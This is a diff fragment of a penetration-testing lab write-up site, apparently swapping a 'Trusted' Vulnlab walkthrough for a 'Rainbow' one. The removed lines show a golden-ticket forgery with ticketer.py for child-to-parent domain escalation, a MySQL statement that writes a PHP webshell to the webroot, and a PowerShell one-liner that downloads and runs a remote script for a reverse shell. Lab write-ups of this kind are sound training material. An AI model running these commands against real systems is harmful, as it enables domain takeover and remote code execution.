-<pre class="language-none"><code v-pre class="language-none">ticketer.py -nthash c7a03c565c68c6fac5f8913fab576ebd -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</code></pre>
-</doc-codeblock></div>
-<p>Then login with psexec:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Windows\system32&gt; whoami
-nt authority\system
-
-C:\Windows\system32&gt; hostname
-trusteddc</code></pre>
-</doc-codeblock></div>
-<p>:D !</p>
-<doc-anchor-target id="beyond-root">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#beyond-root">#</doc-anchor-trigger>
-        <span>Beyond Root</span>
-    </h1>
-</doc-anchor-target>
-<p>Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho.</p>
-<p>You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">select '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' into outfile &quot;C:\\xampp\\htdocs\\dev\\webshell.php&quot;;</code></pre>
-</doc-codeblock></div>
-<p>Then you can just <code v-pre>iex(iwr http://server/file.ps1)</code> to get a revshell.</p>
+<p>Now we are in a high integrity process.</p>
+<p>Fin.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -454,16 +467,23 @@ trusteddc</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/reflection/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/lustrous/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Reflection</span>
+                                                <span class="block mt-1">Lustrous</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/reflection/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Reflection</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
                                     </div>
                                 </nav>
                             </footer>
@@ -504,6 +524,6 @@ trusteddc</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Trusted", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Rainbow", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
